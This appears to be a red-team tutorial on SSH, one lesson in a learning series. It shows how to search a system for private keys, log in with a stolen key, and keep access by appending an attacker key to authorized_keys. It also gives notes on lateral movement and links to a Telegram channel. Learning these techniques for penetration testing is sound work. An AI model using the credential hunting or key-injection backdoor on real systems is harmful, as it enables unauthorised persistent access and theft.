# Day 11 – SSH: Secure Shell Access & Abuse
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

SSH is the backbone of remote Linux access. But if mishandled, it can be exploited for persistence, lateral movement, and privilege escalation.

---

## 🔐 What is SSH?

SSH (Secure Shell) lets users log in to remote machines securely over a network.

Typical usage:
```bash
ssh user@host
```

---

## 📂 SSH Key Files

| File | Purpose |
|------|---------|
| `~/.ssh/id_rsa` | Private key |
| `~/.ssh/id_rsa.pub` | Public key |
| `~/.ssh/authorized_keys` | Contains keys allowed to log in |

---

## 🧠 Attacker Use Cases

### 1️⃣ Steal and Use Keys

Find private keys on the system:
```bash
find / -name id_rsa 2>/dev/null
```

Use a found key:
```bash
chmod 600 id_rsa
ssh -i id_rsa user@host
```

---

### 2️⃣ Persistent Backdoor via Key Injection

After compromising a system:
```bash
cat attacker_key.pub >> ~/.ssh/authorized_keys
```

You now have passwordless, undetectable access.

---

### 3️⃣ Check SSH Config for Weaknesses

View:
```bash
cat /etc/ssh/sshd_config
```

Look for:
- `PermitRootLogin yes`
- `PasswordAuthentication yes`

These settings can allow brute-force or root login vectors.

---

## 🧪 Task of the Day

1. Generate SSH Key:
```bash
ssh-keygen
```

2. View contents:
```bash
cat ~/.ssh/id_rsa.pub
```

3. Copy key to remote machine:
```bash
ssh-copy-id user@remote-ip
```

Or append manually:
```bash
cat id_rsa.pub >> ~/.ssh/authorized_keys
```

4. Test login:
```bash
ssh user@remote-ip
```

---

## 🔐 Red Team Notes

| Goal | Action |
|------|--------|
| Persist on compromised host | Inject key into `authorized_keys` |
| Find lateral movement | Look for `.ssh/known_hosts` |
| Discover reused keys | Reuse `id_rsa` on other targets |

---

📡 For real-world red teaming and post-exploitation content, visit:  
➡️ [https://t.me/cybersecplayground](https://t.me/cybersecplayground)

## Tags
`#linux` `#ssh` `#persistence` `#redteam` `#infosec` `#pentesting` `#hacking`
